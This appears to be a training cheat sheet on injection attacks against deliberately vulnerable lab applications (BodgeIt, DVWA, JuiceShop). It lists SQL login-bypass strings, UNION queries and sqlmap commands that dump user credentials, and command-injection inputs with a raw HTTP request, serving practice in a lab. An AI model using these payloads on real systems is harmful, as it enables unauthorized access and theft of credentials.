# A1 - Injection


## SQL Injection

### BodgeIt 

BodgeIt login

`' or 1=1);--`

`admin@thebodgeitstore.com' or '1'='1);--`

### DVWA

**SQLi** on [DVWA](http://dvwa.lab/dvwa/vulnerabilities/sqli/)

```
1' or '1'='1
1' or 1=1#
1' union select null, version()#
1' union select null, concat(user(),0x0a,database())#
1' and 1=0 union select null, table_name from information_schema.tables#
1' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
1' and 1=0 union select null, concat(first_name,0x20,last_name,0x3a,user,0x3a,password) from users #
```

**Blind SQLi** on [DVWA](http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/)

The value of `PHPSESSID` needs to be changed to your actual value.

```
sqlmap -u  "http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --cookie="PHPSESSID=m0om832mi963uuqftigjrk1n7j; security=low"

sqlmap -u  "http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --cookie="PHPSESSID=m0om832mi963uuqftigjrk1n7j; security=low" --dbs

sqlmap -u  "http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --cookie="PHPSESSID=m0om832mi963uuqftigjrk1n7j; security=low" -D dvwa --tables

sqlmap -u  "http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --cookie="PHPSESSID=m0om832mi963uuqftigjrk1n7j; security=low" -D dvwa -T users --columns

sqlmap -u  "http://dvwa.lab/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --cookie="PHPSESSID=m0om832mi963uuqftigjrk1n7j; security=low" -D dvwa -T users --dump
```



### JuiceShop

JuiceShop login as `admin@juice-sh.op`

`' or true--`



## Command injection

Try it on `http://dvwa.lab/dvwa/vulnerabilities/exec/`

```
127.0.0.1;id
127.0.0.1&id
x||id
```

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: dvwa.lab
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dvwa.lab/dvwa/vulnerabilities/exec/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Cookie: security=high; PHPSESSID=1mdh1pt8dt42taesnorvlh9og2
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%0d%0Aid&Submit=Submit
```
